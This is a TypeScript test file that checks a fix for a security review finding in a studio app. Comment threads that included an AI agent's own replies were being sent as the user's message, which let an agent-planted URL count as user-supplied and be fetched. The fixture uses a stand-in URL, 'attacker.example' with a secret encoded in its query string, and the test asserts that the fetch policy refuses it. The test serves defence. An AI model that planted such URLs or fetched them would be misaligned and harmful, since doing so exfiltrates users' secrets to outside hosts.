/**
 * Security review of #248, finding 2: "Address with AI" sends every comment in
 * a thread — the AI's own earlier replies included — as the USER's message.
 * A URL the agent planted in a reply (with a secret in its query string) then
 * counted as one the user pasted, and `studio_fetch_remote_asset` would fetch
 * it. The composed block is marked `origin: 'studio'` in the browser, the mark
 * survives the chat handler's canonicalisation (the same path the persisted
 * history and both the HTTP and CLI paths read), and `collectUserSuppliedUrls`
 * skips it.
 */
import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
import type { CommentThread } from '@core/studio-comments'
import type { AiUserContentBlock } from '@core/ai'
import { useEditorStore } from '@site/store/store'
import { sendThreadsToAgent } from '@site/studio/commentBulkActions'
import { canonicaliseAiUserContent, preflightAiUserContent } from '../../../server/ai/inputImages'
import { collectUserSuppliedUrls } from '../../../server/ai/mcp/tools/studio/remoteFetchPolicy'
import { remoteFetchRefusal } from '../../../server/ai/mcp/tools/studio/remoteFetchPolicy'

const PLANTED = 'https://attacker.example/p.png?d=c2VjcmV0'

const thread: CommentThread = {
  id: 't1',
  seq: 1,
  boardId: 'b1',
  anchor: { frameId: null, pageId: null, dx: 0, dy: 0, node: null },
  resolved: false,
  createdAt: '2026-09-24T00:00:00.000Z',
  comments: [
    { id: 'c1', author: { userId: 'u1', displayName: 'Maher', kind: 'user' }, body: 'The logo is too small.', createdAt: '2026-09-24T00:00:00.000Z', editedAt: null },
    { id: 'c2', author: { userId: 'agent', displayName: 'Assistant', kind: 'agent' }, body: `Enlarged it; reference ${PLANTED}`, createdAt: '2026-09-24T00:01:00.000Z', editedAt: null },
  ],
}

let sent: AiUserContentBlock[] | null
const original = useEditorStore.getState()

beforeEach(() => {
  sent = null
  useEditorStore.setState({
    openAgent: () => {},
    clearSelectedThreads: () => {},
    sendAgentMessage: async (content: AiUserContentBlock[]) => {
      sent = content
      return { accepted: true }
    },
  } as never)
})

afterEach(() => {
  useEditorStore.setState({
    openAgent: original.openAgent,
    clearSelectedThreads: original.clearSelectedThreads,
    sendAgentMessage: original.sendAgentMessage,
  } as never)
})

describe('Studio-composed text is never a URL the user supplied (review of #248, F2)', () => {
  it('"Address with AI" quoting an AI-authored URL gives no user URL, and the fetch policy still refuses it', async () => {
    expect(await sendThreadsToAgent([thread])).toBe(true)
    expect(sent).not.toBeNull()
    const text = sent!.find((block) => block.kind === 'text')
    expect(text && 'text' in text ? text.text : '').toContain(PLANTED)

    // The chat handler's own path: preflight, canonicalise, then the history.
    const content = await canonicaliseAiUserContent(preflightAiUserContent(sent!))
    const urls = collectUserSuppliedUrls([{ role: 'user', content }])
    expect(urls).toEqual([])
    expect(remoteFetchRefusal(PLANTED, { userSuppliedUrls: urls }, { allowLoopback: false })?.code).toBe('host-not-allowed')
  })

  it('text the user typed still counts', async () => {
    const content = await canonicaliseAiUserContent(preflightAiUserContent([{ kind: 'text', text: `use ${PLANTED}` }]))
    expect(collectUserSuppliedUrls([{ role: 'user', content }])).toEqual([PLANTED])
  })
})
